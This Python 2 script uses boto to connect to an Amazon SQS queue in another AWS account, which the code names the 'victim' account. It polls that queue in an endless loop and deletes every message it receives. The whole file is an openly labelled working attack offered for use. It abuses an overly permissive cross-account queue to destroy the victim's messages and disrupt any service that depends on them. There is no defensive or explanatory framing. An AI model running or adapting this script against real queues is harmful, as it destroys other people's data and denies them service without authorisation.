import boto
import time
import sys
import getopt
import logging
from boto.sqs.message import RawMessage
from boto.sqs.message import Message

##########################################################
# Connect to SQS and poll for messages
##########################################################
def main():
    region_name = "victimregion"
    input_queue_name = "input"
    aws_access_key_id = "youraccount"
    aws_secret_key = "yoursecret"
    victim_account = "victimaccount"

    try:
        # Connect to SQS and open queue
        sqs = boto.sqs.connect_to_region(region_name, aws_access_key_id=aws_access_key_id, aws_secret_access_key=aws_secret_key)
    except Exception as ex:
        print "Encountered an error setting SQS region.  Please confirm you have queues in %s." % (region_name)
        sys.exit(1)
    try:
        input_queue = sqs.get_queue(input_queue_name, owner_acct_id=victim_account)
        input_queue.set_message_class(RawMessage)
    except Exception as ex:
        print "Encountered an error connecting to SQS queue %s. Confirm that your input queue exists." % (input_queue_name)
        sys.exit(2)

    print "Polling input queue..."

    print "Starting infinite loop..."
    while True:
        # Get messages
        print "checking..."
        rs = input_queue.get_messages(num_messages=1)

        if len(rs) > 0:
            # Iterate each message
            for raw_message in rs:
                print "deleting a message"
                input_queue.delete_message(raw_message)

                sys.stdout.flush()
        time.sleep(2)

if __name__ == "__main__":
    sys.exit(main())

